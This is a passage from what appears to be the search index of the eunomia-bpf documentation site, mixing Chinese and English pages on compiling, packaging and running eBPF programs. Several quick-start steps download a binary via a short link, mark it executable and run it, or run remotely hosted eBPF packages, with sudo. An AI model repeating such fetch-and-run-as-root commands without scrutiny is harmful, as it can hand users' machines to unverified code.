\u81ea\u52a8\u83b7\u53d6\u5185\u6838\u6001\u4e0a\u62a5\u7684\u8fd4\u56de\u6570\u636e\u3002\u5bf9\u4e8e\u521d\u5b66\u8005\u800c\u8a00\uff0c\u8fd9\u53ef\u80fd\u6bd4\u4f7f\u7528 WebAssembly \u66f4\u52a0\u7b80\u5355\u65b9\u4fbf\uff1a\u53ea\u9700\u8981\u7f16\u5199\u5185\u6838\u6001\u7684 eBPF \u7a0b\u5e8f\uff0c\u7136\u540e\u4f7f\u7528 eunomia-cc \u5de5\u5177\u94fe\u5c06\u5176\u7f16\u8bd1\u4e3a JSON \u683c\u5f0f\uff0c\u6700\u540e\u4f7f\u7528 eunomia-bpf \u5e93\u52a0\u8f7d\u548c\u8fd0\u884c\u5373\u53ef\u3002\u5b8c\u5168\u4e0d\u7528\u8003\u8651\u4efb\u4f55\u7528\u6237\u6001\u7684\u8f85\u52a9\u7a0b\u5e8f\uff0c\u5305\u62ec Wasm \u5728\u5185\u3002\u5177\u4f53\u53ef\u4ee5\u53c2\u8003\u6211\u4eec\u7684\u4f7f\u7528\u624b\u518c[7]\u6216\u793a\u4f8b\u4ee3\u7801[8]\u3002</p>"},{"location":"eunomia-bpf/manual/#_2","title":"\u539f\u7406","text":"<p><code>ecli</code> \u662f\u57fa\u4e8e\u6211\u4eec\u5e95\u5c42\u7684 eunomia-bpf \u5e93\u548c\u8fd0\u884c\u65f6\u5b9e\u73b0\u7684\u4e00\u4e2a\u7b80\u5355\u7684\u547d\u4ee4\u884c\u5de5\u5177\u3002\u6211\u4eec\u7684\u9879\u76ee\u67b6\u6784\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p> <p><code>ecli</code> \u5de5\u5177\u57fa\u4e8e <code>ewasm</code> \u5e93\u5b9e\u73b0\uff0c<code>ewasm</code> \u5e93\u5305\u542b\u4e00\u4e2a WAMR(wasm-micro-runtime) \u8fd0\u884c\u65f6\uff0c\u4ee5\u53ca\u57fa\u4e8e libbpf \u5e93\u6784\u5efa\u7684 eBPF \u52a8\u6001\u88c5\u8f7d\u6a21\u5757\u3002\u5927\u81f4\u6765\u8bf4\uff0c\u6211\u4eec\u5728 <code>Wasm</code> \u8fd0\u884c\u65f6\u548c\u7528\u6237\u6001\u7684 <code>libbpf</code> \u4e2d\u95f4\u591a\u52a0\u4e86\u4e00\u5c42\u62bd\u8c61\u5c42\uff08<code>eunomia-bpf</code> \u5e93\uff09\uff0c\u4f7f\u5f97\u4e00\u6b21\u7f16\u8bd1\u3001\u5230\u5904\u8fd0\u884c\u7684 eBPF \u4ee3\u7801\u53ef\u4ee5\u4ece JSON \u5bf9\u8c61\u4e2d\u52a8\u6001\u52a0\u8f7d\u3002JSON \u5bf9\u8c61\u4f1a\u5728\u7f16\u8bd1\u65f6\u88ab\u5305\u542b\u5728 Wasm \u6a21\u5757\u4e2d\uff0c\u56e0\u6b64\u5728\u8fd0\u884c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u89e3\u6790 JSON \u5bf9\u8c61\u6765\u83b7\u53d6 eBPF \u7a0b\u5e8f\u7684\u4fe1\u606f\uff0c\u7136\u540e\u52a8\u6001\u52a0\u8f7d eBPF \u7a0b\u5e8f\u3002</p> <p>\u4f7f\u7528 Wasm \u6216 JSON \u7f16\u8bd1\u5206\u53d1 eBPF \u7a0b\u5e8f\u7684\u6d41\u7a0b\u56fe\u5927\u81f4\u5982\u4e0b\uff1a</p> <pre><code>graph TD\n  b3--&gt;package\n  b4--&gt;a3\n  package--&gt;a1\n  package(\u53ef\u901a\u8fc7\u7f51\u7edc\u6216\u5176\u4ed6\u4efb\u610f\u65b9\u5f0f\u8fdb\u884c\u5206\u53d1: CO-RE)\n\n  subgraph \u8fd0\u884c\u65f6\u52a0\u8f7d\u5668\u5e93\n  a3(\u8fd0\u884c Wasm \u6a21\u5757\u914d\u7f6e eBPF \u7a0b\u5e8f\u6216\u548c eBPF \u7a0b\u5e8f\u4ea4\u4e92)\n  a1(\u6839\u636e JSON \u914d\u7f6e\u4fe1\u606f\u52a8\u6001\u88c5\u8f7d eBPF \u7a0b\u5e8f)\n  a2(\u6839\u636e\u7c7b\u578b\u4fe1\u606f\u548c\u5185\u5b58\u5e03\u5c40\u4fe1\u606f\u5bf9\u5185\u6838\u6001\u5bfc\u51fa\u4e8b\u4ef6\u8fdb\u884c\u52a8\u6001\u5904\u7406)\n  a1--&gt;a2\n  a3--&gt;a1\n  a2--&gt;a3\n  end\n\n  subgraph eBPF\u7f16\u8bd1\u5de5\u5177\u94fe\n  b1(\u4f7f\u7528 Clang \u7f16\u8bd1 eBPF \u7a0b\u5e8f\u83b7\u5f97\u5305\u542b\u91cd\u5b9a\u4f4d\u4fe1\u606f\u7684 bpf.o)\n  b2(\u6dfb\u52a0\u4ece eBPF \u6e90\u4ee3\u7801\u83b7\u53d6\u7684\u5185\u6838\u6001\u5bfc\u51fa\u6570\u636e\u7684\u5185\u5b58\u5e03\u5c40, \u7c7b\u578b\u4fe1\u606f\u7b49)\n  b3(\u6253\u5305\u751f\u6210 JSON \u6570\u636e)\n  b4(\u6253\u5305\u6210 Wasm \u6a21\u5757\u8fdb\u884c\u5206\u53d1)\n  b5(\u53ef\u9009\u7684\u7528\u6237\u6001\u6570\u636e\u5904\u7406\u7a0b\u5e8f\u7f16\u8bd1\u4e3a Wasm)\n  b2--&gt;b3\n  b3--&gt;b5\n  b5--&gt;b4\n  b1--&gt;b2\n  end\n</code></pre> <p>\u5927\u81f4\u6765\u8bf4\uff0c\u6574\u4e2a eBPF \u7a0b\u5e8f\u7684\u7f16\u5199\u548c\u52a0\u8f7d\u5206\u4e3a\u4e09\u4e2a\u90e8\u5206\uff1a</p> <ol> <li>\u7528 eunomia-cc \u5de5\u5177\u94fe\u5c06\u5185\u6838\u7684 eBPF \u4ee3\u7801\u9aa8\u67b6\u548c\u5b57\u8282\u7801\u7f16\u8bd1\u4e3a JSON \u683c\u5f0f</li> <li>\u5728\u7528\u6237\u6001\u5f00\u53d1\u7684\u9ad8\u7ea7\u8bed\u8a00\uff08\u4f8b\u5982 C \u8bed\u8a00\uff09\u4e2d\u5d4c\u5165 JSON \u6570\u636e\uff0c\u5e76\u63d0\u4f9b\u4e00\u4e9b API \u7528\u4e8e\u64cd\u4f5c JSON \u5f62\u6001\u7684 eBPF \u7a0b\u5e8f\u9aa8\u67b6</li> <li>\u5c06\u7528\u6237\u6001\u7a0b\u5e8f\u548c JSON \u6570\u636e\u4e00\u8d77\u7f16\u8bd1\u4e3a Wasm \u5b57\u8282\u7801\u5e76\u6253\u5305\u4e3a Wasm \u6a21\u5757\uff0c\u7136\u540e\u5728\u76ee\u6807\u673a\u5668\u4e0a\u52a0\u8f7d\u5e76\u8fd0\u884c Wasm \u7a0b\u5e8f</li> <li>\u4ece Wasm \u6a21\u5757\u4e2d\u52a0\u8f7d\u5185\u5d4c\u7684 JSON \u6570\u636e\uff0c\u7528 eunomia-bpf \u5e93\u52a8\u6001\u88c5\u8f7d\u548c\u914d\u7f6e eBPF \u7a0b\u5e8f\u9aa8\u67b6\u3002</li> </ol> <p>\u6211\u4eec\u9700\u8981\u5b8c\u6210\u7684\u4ec5\u4ec5\u662f\u5c11\u91cf\u7684 native API \u548c Wasm \u8fd0\u884c\u65f6\u7684\u7ed1\u5b9a\uff0c\u5e76\u4e14\u5728 Wasm \u4ee3\u7801\u4e2d\u5904\u7406 JSON \u6570\u636e\u3002\u4f60\u53ef\u4ee5\u5728\u4e00\u4e2a\u5355\u4e00\u7684 <code>Wasm</code> \u6a21\u5757\u4e2d\u62e5\u6709\u591a\u4e2a <code>eBPF</code> \u7a0b\u5e8f\u3002\u5982\u679c\u4e0d\u4f7f\u7528\u6211\u4eec\u63d0\u4f9b\u7684 Wasm \u8fd0\u884c\u65f6\uff0c\u6216\u8005\u60f3\u8981\u4f7f\u7528\u5176\u4ed6\u8bed\u8a00\u8fdb\u884c\u7528\u6237\u6001\u7684 eBPF \u8f85\u52a9\u4ee3\u7801\u7684\u5f00\u53d1\uff0c\u5728\u6211\u4eec\u63d0\u4f9b\u7684 <code>eunomia-bpf</code> \u5e93\u57fa\u7840\u4e0a\u5b8c\u6210\u4e00\u4e9b WebaAssembly \u7684\u7ed1\u5b9a\u5373\u53ef\u3002</p> <p>\u53e6\u5916\uff0c\u5bf9\u4e8e eunomia-bpf \u5e93\u800c\u8a00\uff0c\u4e0d\u9700\u8981 Wasm \u6a21\u5757\u548c\u8fd0\u884c\u65f6\u540c\u6837\u53ef\u4ee5\u542f\u52a8\u548c\u52a8\u6001\u52a0\u8f7d eBPF \u7a0b\u5e8f\uff0c\u4e0d\u8fc7\u6b64\u65f6\u52a8\u6001\u52a0\u8f7d\u8fd0\u884c\u7684\u5c31\u53ea\u662f\u5185\u6838\u6001\u7684 eBPF \u7a0b\u5e8f\u5b57\u8282\u7801\u3002\u4f60\u53ef\u4ee5\u624b\u52a8\u6216\u4f7f\u7528\u4efb\u610f\u8bed\u8a00\u4fee\u6539 JSON \u5bf9\u8c61\u6765\u63a7\u5236 eBPF \u7a0b\u5e8f\u7684\u52a0\u8f7d\u548c\u53c2\u6570\uff0c\u5e76\u4e14\u901a\u8fc7 eunomia-bpf \u81ea\u52a8\u83b7\u53d6\u5185\u6838\u6001\u4e0a\u62a5\u7684\u8fd4\u56de\u6570\u636e\u3002\u5bf9\u4e8e\u521d\u5b66\u8005\u800c\u8a00\uff0c\u8fd9\u53ef\u80fd\u6bd4\u4f7f\u7528 WebAssembly \u66f4\u52a0\u7b80\u5355\u65b9\u4fbf\uff1a\u53ea\u9700\u8981\u7f16\u5199\u5185\u6838\u6001\u7684 eBPF \u7a0b\u5e8f\uff0c\u7136\u540e\u4f7f\u7528 eunomia-cc \u5de5\u5177\u94fe\u5c06\u5176\u7f16\u8bd1\u4e3a JSON \u683c\u5f0f\uff0c\u6700\u540e\u4f7f\u7528 eunomia-bpf \u5e93\u52a0\u8f7d\u548c\u8fd0\u884c\u5373\u53ef\u3002\u5b8c\u5168\u4e0d\u7528\u8003\u8651\u4efb\u4f55\u7528\u6237\u6001\u7684\u8f85\u52a9\u7a0b\u5e8f\uff0c\u5305\u62ec Wasm \u5728\u5185\u3002\u5177\u4f53\u53ef\u4ee5\u53c2\u8003\u6211\u4eec\u7684\u4f7f\u7528\u624b\u518c[7]\u6216\u793a\u4f8b\u4ee3\u7801[8]\u3002</p>"},{"location":"eunomia-bpf/manual/#_3","title":"\u4e3a\u6211\u4eec\u7684\u9879\u76ee\u8d21\u732e\u4ee3\u7801","text":"<p>\u6211\u4eec\u7684\u9879\u76ee\u8fd8\u5728\u65e9\u671f\u9636\u6bb5\uff0c\u56e0\u6b64\u975e\u5e38\u5e0c\u671b\u6709\u60a8\u7684\u5e2e\u52a9\uff1a</p> <ul> <li>\u8fd0\u884c\u65f6\u5e93\u5730\u5740\uff1a https://github.com/eunomia-bpf/eunomia-bpf</li> <li>\u7f16\u8bd1\u5668\u5730\u5740\uff1a https://github.com/eunomia-bpf/eunomia-cc</li> <li>\u6587\u6863\uff1ahttps://github.com/eunomia-bpf/eunomia-bpf.github.io</li> </ul> <p>eunomia-bpf \u4e5f\u5df2\u7ecf\u52a0\u5165\u4e86\u9f99\u8725\u793e\u533a\uff1a</p> <ul> <li>gitee \u955c\u50cf\uff1ahttps://gitee.com/anolis/eunomia</li> </ul> <p>\u60a8\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u6dfb\u52a0\u6d4b\u8bd5\u6216\u8005\u793a\u4f8b\uff0c\u53ef\u4ee5\u53c2\u8003\uff1a</p> <ul> <li>examples/bpftools</li> <li>bpftools/tests</li> </ul> <p>\u7531\u4e8e\u73b0\u5728 API \u8fd8\u4e0d\u7a33\u5b9a\uff0c\u5982\u679c\u60a8\u5728\u8bd5\u7528\u4e2d\u9047\u5230\u4efb\u4f55\u95ee\u9898\u6216\u8005\u4efb\u4f55\u6d41\u7a0b/\u6587\u6863\u4e0d\u5b8c\u5584\u7684\u5730\u65b9\uff0c\u8bf7\u5728 gitee \u6216 github issue \u7559\u8a00\uff0c \u6211\u4eec\u4f1a\u5c3d\u5feb\u4fee\u590d\uff1b\u4e5f\u975e\u5e38\u6b22\u8fce\u8fdb\u4e00\u6b65\u7684 PR \u63d0\u4ea4\u548c\u8d21\u732e\uff01\u4e5f\u975e\u5e38\u5e0c\u671b\u60a8\u80fd\u63d0\u51fa\u4e00\u4e9b\u5b9d\u8d35\u7684\u610f\u89c1\u6216\u8005\u5efa\u8bae\uff01</p> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/online/","title":"\u5728\u7ebf\u4f53\u9a8c\u7f51\u7ad9","text":"<p>\u53ef\u4f7f\u7528 bolipi \u63d0\u4f9b\u7684\u5728\u7ebf\u4f53\u9a8c\u670d\u52a1\uff0c\u5728\u7ebf\u7f16\u8bd1\uff0c\u5728\u7ebf\u8fd0\u884c\u3001\u5728\u7ebf\u83b7\u53d6\u53ef\u89c6\u5316\u7ed3\u679c\uff1ahttps://bolipi.com/ebpf/home/online</p> <p></p>"},{"location":"eunomia-bpf/online/#ebpf","title":"\u901a\u8fc7\u5728\u7ebf\u7f16\u8bd1\u8fd0\u884c\u5feb\u901f\u4f53\u9a8c eBPF \u548c\u53ef\u89c6\u5316","text":"<p>\u672c\u5728\u7ebf\u7f16\u8bd1\u5e73\u53f0\u7531 <code>eunomia-bpf</code> \u5de5\u5177\u94fe\u63d0\u4f9b\u652f\u6301\uff0c\u8be6\u7ec6\u6587\u6863\u8bf7\u53c2\u8003 eunomia-bpf.github.io/</p>"},{"location":"eunomia-bpf/online/#_2","title":"\u5728\u7ebf\u7f16\u8bd1","text":"<p>\u5728\u4ee3\u7801\u7f16\u8f91\u5668\u4e2d\u7f16\u5199 eBPF \u7684\u5185\u6838\u6001\u7a0b\u5e8f\uff0c\u5e94\u5f53\u9075\u5faa libbpf-tools \u7684\u5185\u6838\u6001\u4ee3\u7801\u7f16\u5199\u7ea6\u5b9a\uff0c\u5373\uff1a</p> <ul> <li><code>\u4ee3\u7801\u7f16\u8f91\u5668</code> (*.bpf.c) \u5305\u542b BPF C \u4ee3\u7801\uff0c\u5b83\u88ab\u7f16\u8bd1\u6210 package.json</li> <li><code>\u5934\u6587\u4ef6\u7f16\u8f91\u5668</code> (*.h) \u53ef\u4ee5\u9009\u62e9\u5305\u542b\u901a\u8fc7 perf event \u6216\u73af\u5f62\u7f13\u51b2\u533a\u5bfc\u51fa\u5230\u7528\u6237\u7a7a\u95f4\u7684\u7c7b\u578b</li> </ul> <p>\u6211\u4eec\u76ee\u524d\u53ea\u652f\u6301\u4f7f\u7528\u57fa\u4e8e libbpf \u7684\u5185\u6838\u6001\u4ee3\u7801\uff0cBCC \u4ee3\u7801\u652f\u6301\u7531\u4e8e\u5b58\u5728\u4e00\u4e9b\u8bed\u6cd5\u4e0a\u7684\u5dee\u5f02\uff0c\u8fd8\u5728\u5f00\u53d1\u4e2d\u3002</p> <p>\u7f16\u5199\u5b8c\u6210\u4ee3\u7801\u540e\uff0c\u70b9\u51fb <code>\u7f16\u8bd1</code> \u6309\u94ae\u5373\u53ef\u7f16\u8bd1\u6210 eBPF \u7684\u5185\u6838\u6001\u7a0b\u5e8f\uff0c\u5728 <code>\u7f16\u8bd1\u8f93\u51fa</code> \u4e2d\u67e5\u770b\u7f16\u8bd1\u8f93\u51fa\uff1a</p> <p></p> <p>\u66f4\u591a\u4fe1\u606f\u8bf7\u53c2\u8003\uff1aeunomia-bpf.github.io/mannual.html</p> <p>\u66f4\u591a\u4f8b\u5b50\u8bf7\u53c2\u8003\uff1ahttps://github.com/eunomia-bpf/eunomia-bpf/tree/master/examples/bpftools</p>"},{"location":"eunomia-bpf/online/#_3","title":"\u5728\u7ebf\u8fd0\u884c","text":"<p>\u70b9\u51fb\u53f3\u4fa7\u7684\u7eff\u8272\u8fd0\u884c\u6309\u94ae\u8fd0\u884c\uff1a</p> <p></p> <p>\u4e5f\u53ef\u4ee5\u901a\u8fc7 <code>\u4e0b\u8f7d\u7f16\u8bd1\u540e\u7684\u6587\u4ef6</code> \u67e5\u770b\u7f16\u8bd1\u597d\u7684\u7a0b\u5e8f\uff0c\u5e76\u5728\u672c\u5730\u4f7f\u7528 <code>ecli</code> \u76f4\u63a5\u8fd0\u884c\uff1a</p> <pre><code># \u4e0b\u8f7d\u5b89\u88c5 ecli \u4e8c\u8fdb\u5236\nwget https://aka.pw/bpf-ecli -O ./ecli &amp;&amp; chmod +x ./ecli\n# \u8fd0\u884c eBPF \u7a0b\u5e8f\uff08root shell\uff09\nsudo ./ecli run package.json\n</code></pre>"},{"location":"eunomia-bpf/online/#prometheus","title":"\u4f7f\u7528 Prometheus \u5728\u7ebf\u83b7\u53d6\u53ef\u89c6\u5316\u7ed3\u679c","text":"<p>\u70b9\u51fb <code>\u8fd0\u884c\u53ef\u89c6\u5316\u7ec4\u4ef6</code> \u6309\u94ae\uff0c\u5728\u5f39\u51fa\u7684\u7a97\u53e3\u4e2d\u914d\u7f6e prometheus metrics \u4fe1\u606f:</p> <p></p> <p>\u70b9\u51fb <code>\u786e\u5b9a</code> \u5373\u53ef\u8df3\u8f6c\u5230 Prometheus \u754c\u9762\uff0c\u53ef\u901a\u8fc7\u9009\u62e9 graph \u67e5\u770b\u53ef\u89c6\u5316\u7ed3\u679c\uff1a</p> <p></p>"},{"location":"eunomia-bpf/online/#eunomia-bpf","title":"\u5173\u4e8e eunomia-bpf","text":"<p>eunomia-bpf \u662f\u4e00\u5957\u7f16\u8bd1\u5de5\u5177\u94fe\u548c\u8fd0\u884c\u65f6\uff0c\u4ee5\u53ca\u4e00\u4e9b\u9644\u52a0\u9879\u76ee\uff0c\u6211\u4eec\u5e0c\u671b\u505a\u5230\u8ba9 eBPF \u7a0b\u5e8f\uff1a</p> <ul> <li>\u8ba9 eBPF \u7a0b\u5e8f\u7684\u7f16\u8bd1\u548c\u8fd0\u884c\u8fc7\u7a0b\u5927\u5927\u7b80\u5316\uff0c\u629b\u53bb\u7e41\u7410\u7684\u7528\u6237\u6001\u6a21\u677f\u7f16\u5199\u3001\u7e41\u7410\u7684 BCC \u5b89\u88c5\u6d41\u7a0b\uff0c\u53ea\u9700\u8981\u7f16\u5199\u5185\u6838\u6001 eBPF \u7a0b\u5e8f\uff0c\u7f16\u8bd1\u540e\u5373\u53ef\u5728\u4e0d\u540c\u673a\u5668\u4e0a\u4efb\u610f\u5185\u6838\u7248\u672c\u4e0b\u8fd0\u884c\uff0c\u5e76\u4e14\u8f7b\u677e\u83b7\u53d6\u53ef\u89c6\u5316\u7ed3\u679c\u3002</li> <li>\u771f\u6b63\u50cf JavaScript \u6216\u8005 Wasm \u90a3\u6837\u6613\u4e8e\u5206\u53d1\u548c\u8fd0\u884c\uff0c\u6216\u8005\u8bf4\u5185\u6838\u6001\u6216\u53ef\u89c2\u6d4b\u6027\u5c42\u9762\u7684 FaaS\uff1aeBPF \u5373\u670d\u52a1\uff0c\u901a\u8fc7 API \u8bf7\u6c42\u5feb\u901f\u5206\u53d1\u548c\u8fd0\u884c\uff0c\u65e0\u9700\u7ba1\u7406\u57fa\u7840\u8bbe\u65bd\u548c\u7528\u6237\u6001\u52a0\u8f7d\u7a0b\u5e8f\uff1b</li> </ul> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/quickstart/","title":"Quick Start","text":"<ul> <li>Github Template\uff1aeunomia-bpf/ebpm-template</li> <li>example bpf programs: examples/bpftools</li> <li>tutorial: eunomia-bpf/bpf-developer-tutorial</li> </ul> <p>You can get pre-compiled eBPF programs running from the cloud to the kernel in <code>1</code> line of bash:</p> <pre><code>    # download the release from https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecli\n    $ wget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli\n    $ sudo ./ecli https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/package.json # simply run a pre-compiled ebpf code from a url\n    $ sudo ./ecli sigsnoop:latest # run with a name and download the latest version bpf tool from our repo\n</code></pre> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/supporting-external-BTF/","title":"supporting external BTF","text":"<p>1.\u786e\u8ba4\u5185\u6838BTF\u9009\u9879\u5df2\u7ecf\u6253\u5f00</p> <pre><code>CONFIG_DEBUG_INFO=y\nCONFIG_DEBUG_INFO_BTF=y\n</code></pre> <p>\u5982\u679c\u5185\u6838\u9009\u9879\u672a\u5f00\u542f\uff0c\u5c31\u9700\u8981\u91cd\u65b0\u7f16\u8bd1\u5185\u6838</p> <ol> <li>\u786e\u8ba4\u5f53\u524d\u5185\u6838BTF\u4fe1\u606f\u662f\u5426\u53ef\u7528\uff0c\u5982\u4e0d\u53ef\u7528\u9700\u6dfb\u52a0\u5916\u6e90BTF\u4fe1\u606f</li> </ol> <p>\u82e5/sys/kernel/btf/vmlinux\u5b58\u5728\uff0c\u5219BTF\u53ef\u7528\uff0c\u53ef\u901a\u8fc7bpftool\u751f\u6210vmlinux.h</p> <pre><code>apt install linux-tools-(uname -r)-generic\napt install linux-tools-generic\nbpftool btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h\n</code></pre> <p>\u82e5/sys/kernel/btf/vmlinux\u4e0d\u5b58\u5728\uff0c\u5219BTF\u4e0d\u53ef\u7528\uff0c\u53ef\u901a\u8fc7btfhub\u6dfb\u52a0\u5916\u6e90BTF\u4fe1\u606f\u6216\u751f\u6210\u5f53\u524d\u5185\u6838\u7684\u5b9a\u5236\u5316BTF\u4fe1\u606f</p> <p>\uff081\uff09\u6dfb\u52a0\u5916\u6e90BTF\u4fe1\u606f</p> <p>\u53c2\u8003 BTFgen tool to create smaller BTF files</p> <pre><code>$ git clone git@github.com:aquasecurity/btfhub.git\n$ git clone git@github.com:aquasecurity/btfhub-archive.git\n$ cd btfhub ; ls\n//\u5c06\u514b\u9686\u7684\u5f52\u6863\u6587\u4ef6\u653e\u5165 btfhub \u76ee\u5f55\n$ rsync -avz ../btfhub-archive/ --exclude=.git* --exclude=README.md ./archive/\n</code></pre> <p>\u6574\u4e2abtfhub-archive\u76ee\u5f55\u76f8\u5f53\u5e9e\u5927\uff0c\u53ef\u4ee5\u5355\u72ec\u4e0b\u8f7d\u67d0\u4e2aBTF\u5f52\u6863\u6587\u4ef6\u653e\u5165btfhub \u76ee\u5f55</p> <pre><code>$ rsync -avz ../5.11.0-1027-azure.btf.tar.xz --exclude=.git* --exclude=README.md ./archive/\nsending incremental file list\n\nsent 77 bytes  received 12 bytes  178.00 bytes/sec\ntotal size is 144,419  speedup is 1,622.69\n</code></pre> <p>\u4e4b\u540e\u5c31\u53ef\u4ee5\u6839\u636e\u67d0\u4e2a\u5bf9\u5e94\u7684eBPF \u5bf9\u8c61\u751f\u6210\u5b9a\u5236\u7684BTF \u6587\u4ef6</p> <pre><code>#\u751f\u6210\u5b9a\u5236\u7684 eBPF \u5bf9\u8c61\u7684 BTF \u6587\u4ef6:\n$ ./tools/btfgen.sh -a AARCH64 -o $HOME/****.bpf.core.o\n</code></pre> <p>\u68c0\u67e5\u5b9a\u5236\u7684\u65b0\u751f\u6210\u7684 BTF \u6587\u4ef6\u53ca\u5176\u5c3a\u5bf8</p> <pre><code>$ find custom-archive | grep ubuntu | tail -10\n$ls -lah custom-archive/ubuntu/20.04/x86_64/5.8.0-1041-azure.btf\n</code></pre> <p>\uff082\uff09\u751f\u6210\u5f53\u524d\u5185\u6838\u7684\u5b9a\u5236\u5316BTF\u4fe1\u606f</p> <pre><code>$ sudo ./example-static\n$ sudo ./example-c-static\n$ sudo EXAMPLE_BTF_FILE=5.8.0-63-generic.btf ./example-static\n$ sudo EXAMPLE_BTF_FILE=5.8.0-63-generic.btf ./example-c-static\n</code></pre> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/video/","title":"videos","text":"<ul> <li>eunomia-bpf: \u4e00\u4e2a\u5f00\u6e90\u7684 ebpf \u52a8\u6001\u52a0\u8f7d\u8fd0\u884c\u65f6\u548c\u5f00\u53d1\u5de5\u5177\u94fe</li> <li>eunomia-bpf\uff1aeBPF\u8f7b\u91cf\u7ea7\u5f00\u53d1\u6846\u67b6</li> <li>wasm-bpf\uff1aeBPF \u7a0b\u5e8f\u7684 WebAssembly \u7f16\u8bd1\u5de5\u5177\u94fe\u4e0e\u8fd0\u884c\u65f6</li> <li>\u4f7f\u7528 WASM \u5f00\u53d1\u548c\u5206\u53d1 eBPF \u5e94\u7528</li> <li>\u3010\u8fbe\u5766\u79d1\u6280DatenLord\u3011eunomia-bpf: \u7ed3\u5408 wasm \u7684 ebpf \u8f7b\u91cf\u7ea7\u5f00\u53d1\u6846\u67b6</li> <li>eunomia-bpf\uff1a\u8d85\u7b80\u6d01\u7684\u4e91\u7aefeBPF\u90e8\u7f72\u65b9\u5f0f</li> </ul> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/architecture/","title":"Project Architecture","text":"<p>we have a loader library, a compile toolchain, and some additional tools like cli and a custom metrics exporter.</p> <p></p>"},{"location":"eunomia-bpf/architecture/#an-bpf-loader-rs-library","title":"An bpf-loader-rs library","text":"<p>A wrapper of main functions of libbpf-rs, provide the ability to dynamically load eBPF code to the kernel and run it with a simple JSON and a few API.</p> <p>see bpf-loader-rs for details.</p> <p>A simple cli interface is provided for bpf-loader library, which you can use it to start any eBPF program from a url in a command. You can download it from release.</p> <p>see examples for more examples.</p>"},{"location":"eunomia-bpf/architecture/#a-library-to-load-and-operate-ebpf-program-from-a-wasm-module","title":"A library to load and operate eBPF program from a WASM module","text":"<p>Use the <code>eunomia-bpf</code> library to load <code>eBPF</code> program from a <code>WASM</code> module, you can write a WASM module to operate the eBPF program or process the data in user space <code>WASM</code> runtime. The idea is simple:</p> <ol> <li>compile the kernel eBPF code skeleton to the <code>JSON</code> format with <code>eunomia-cc</code> toolchain</li> <li>embed the <code>JSON</code> data in the <code>WASM</code> module, and provide some API for operating the eBPF program skeleton</li> <li>load the <code>JSON</code> data from the <code>WASM</code> module and run the eBPF program skeleton with <code>eunomia-bpf</code> library</li> </ol> <p>You can have multiple <code>eBPF</code> program in a single <code>WASM</code> module.</p> <p>See wasm-runtime for details. In fact, <code>wasm-bpf</code> library only exports a few functions from <code>bpf-loader</code> library to the <code>VM</code>, so you can replace the <code>WASM</code> runtime with your own easily.</p> <p>For example, you can run an eBPF program with a WASM module for an URL:</p> <pre><code>sudo ./ecli run https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/app.wasm\n</code></pre> <p>You can also generate a WASM program template for eBPF or build WASM module with <code>compiler</code> container:</p> <pre><code># for x86_64 and aarch64\ndocker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest gen-wasm-skel # generate WASM app template for eBPF\ndocker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest build-wasm    # Build WASM module\n</code></pre> <p>see sigsnoop example for more detail.</p>"},{"location":"eunomia-bpf/architecture/#a-compile-toolchain-to-help-you-generate-pre-compiled-ebpf-data","title":"A compile toolchain to help you generate pre compiled eBPF data","text":"<p>The toolchain can be used as a docker to generate pre-compiled eBPF data in one command:</p> <p>see the compile toolchains compiler for details.</p> <p>you can also simply use the ebpm-template repo as a template in github, just push to it and github action can help you compile CO-RE ebpf code!</p>"},{"location":"eunomia-bpf/architecture/#other-related-projects","title":"other related projects","text":"<ul> <li> <p>LMP eBPF Hub: github.com/linuxkerneltravel/lmp</p> <p>a package manager for eBPF based on wasm modules</p> </li> <li> <p>bolipi online compiler &amp; runner: https://bolipi.com/ebpf/home/online</p> <p>an online compiler and runner for eBPF program newbies</p> </li> <li> <p>An Observability tool</p> <p>An prometheus and OpenTelemetry exporter for custom eBPF metrics, written in async rust: eunomia-exporter. You can compile it or download from release</p> </li> </ul> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/ecc/","title":"eunomia-cc: compile and package ebpf programs","text":"<ul> <li>A toolchain to simplify <code>writing</code> eBPF programs</li> <li>Build eBPF programs with <code>Wasm</code></li> </ul> <p>Share on  Share on </p>"},{"location":"eunomia-bpf/ecc/docker-usage/","title":"ecc docker usage","text":"","tags":["docker","eunomia-bpf"]},{"location":"eunomia-bpf/ecc/docker-usage/#docker-usage","title":"docker usage","text":"<p>The only file you will need to write is:</p> <pre><code>your_program.bpf.c\nyour_program.h  # optional, if you want to use ring buffer to export events\n</code></pre> <p>after that, simply run this:</p> <pre><code>$ docker run -it -v /path/to/repo/:/src ghcr.io/eunomia-bpf/ecc-`uname -m`:latest # use absolute path\n</code></pre> <p>you will get a <code>package.json</code> in your root dir. Just run:</p> <pre><code>$ sudo ./ecli run package.json\n</code></pre> <p>to start it you can download <code>ecli</code> tool from eunomia-bpf/releases, we have pre-build binaries for linux x86. Small and No dependencies, besides glibc and glibcxx. Or just run this:</p> <pre><code>$ wget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ecli\n</code></pre> <p>The eBPF compiled code can run on different kernel versions(CO-RE). see: github.com/eunomia-bpf/eunomia-bpf for details.</p>","tags":["docker","eunomia-bpf"]},{"location":"eunomia-bpf/ecc/docker-usage/#container-image","title":"container image","text":"<p>simply run:</p> <pre><code>$ docker run -it -v /path/to/repo:/src ghcr.io/eunomia-bpf/ecc-`uname -m`\n</code></pre> <p>Or you can do that without a container, which is listed below:</p>","tags":["docker","eunomia-bpf"]},{"location":"eunomia-bpf/ecc/docker-usage/#github-actions","title":"Github actions","text":"<p>Use this as a github action, to compile online: see eunomia-bpf/ebpm-template). Only three steps</p> <ol> <li>use this repo as a github template: see creating-a-repository-from-a-template</li> <li>modify the <code>bootstrap.bpf.c</code>, commit 